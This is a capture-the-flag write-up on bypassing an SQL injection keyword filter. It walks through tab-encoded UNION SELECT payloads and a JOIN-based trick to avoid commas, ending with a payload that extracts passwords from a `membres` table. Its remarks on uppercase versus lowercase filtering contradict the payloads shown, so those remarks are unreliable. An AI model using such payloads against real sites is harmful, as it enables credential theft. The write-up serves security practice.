# SQL Injection - Filter bypass (Hard - 80 pts)

  

After reviewing the entire website, I found that `id` parameter to show user's information is where we can inject SQL injection.

  

```

***Tip:***

  

*Why I know that. If you get used to SQL injection, you will be sensitive with where the information is leaked.*

  

But in this challenge, there are a lot of characters and words are filtered. I will list some I met: `or, and, ||, /**/, union, select, join, whitespace, like, =,  %0a, %0b, %0c, ',comma(,),...`

  

But with `select` and `union`, just upercase is filtered, when I change these words to lowercase, we can bypass.

  

With these information, my idea is use  `UNION` and `SELECT` to leak information from table membres. Table name and columns name is provide, you can view source to see:

If don't have above provided information, this challenge will become very difficult because when I test, `information_schema.tables, =, like` are filtered so we can't leak table name as well as columns name easily.

  

Okay, back to challenge, because whitespace and many tab character is filter so I will use %09 to replace for whitespace.

  

Now, our payload will look like:

  

```

id=9%09UNION%09SELECT%09pass,1,1,1%09FROM%09membres%09LIMIT%091

```

But the comma (,) character is filtered, so we can use it to select like below payload.

  

So we must find a way to change this select query to other query which have the same meaning.

  

After searching, I found solution:

  

For example, my query is:

```

select 1,2,3;

```

I will rewrite below query use `join`:

  

```

select * from ((select 1)A join (select 2)B join (select 3)C);

```

But there is a small note that with `join` word, the upercase is filtered, but lowercase is not, so in your payload, you must to use `JOIN`.

  

Final payload:

  

```

	id=9%09UNION%09SELECT%09*%09FROM%09((SELECT%09pass%09FROM%09membres%09LIMIT%091)A%09JOIN%09(SELECT%092)B%09JOIN%09(SELECT%093)C%09JOIN%09(SELECT%093)D)

```
